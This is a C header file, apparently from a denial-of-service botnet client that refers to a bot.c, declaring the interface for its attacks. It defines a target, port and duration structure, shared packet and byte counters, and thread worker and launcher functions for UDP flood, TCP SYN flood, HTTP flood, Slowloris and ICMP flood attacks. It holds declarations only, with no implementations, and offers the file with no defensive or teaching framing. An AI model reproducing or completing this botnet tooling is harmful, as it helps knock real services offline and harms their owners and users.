#ifndef ATTACK_METHODS_H
#define ATTACK_METHODS_H

#include <pthread.h>

// Common attack parameters structure
typedef struct {
    char target[256];
    int port;
    int duration;
} attack_params_t;

// Declare as extern (defined in bot.c)
extern volatile int attack_active;
extern volatile long long total_packets_sent;
extern volatile long long total_bytes_sent;
extern volatile int active_threads;

// UDP Methods
void* udp_flood_worker(void* arg);

// TCP Methods  
void* tcp_syn_worker(void* arg);

// HTTP Methods
void* http_flood_worker(void* arg);
void* slowloris_worker(void* arg);

// Special Methods
void* icmp_flood_worker(void* arg);

// Attack controllers
void start_udp_flood(const char* target, int port, int duration, int threads);
void start_tcp_syn(const char* target, int port, int duration, int threads);
void start_http_flood(const char* target, int port, int duration, int threads);
void start_slowloris(const char* target, int port, int duration, int threads);
void start_icmp_flood(const char* target, int duration, int threads);

#endif
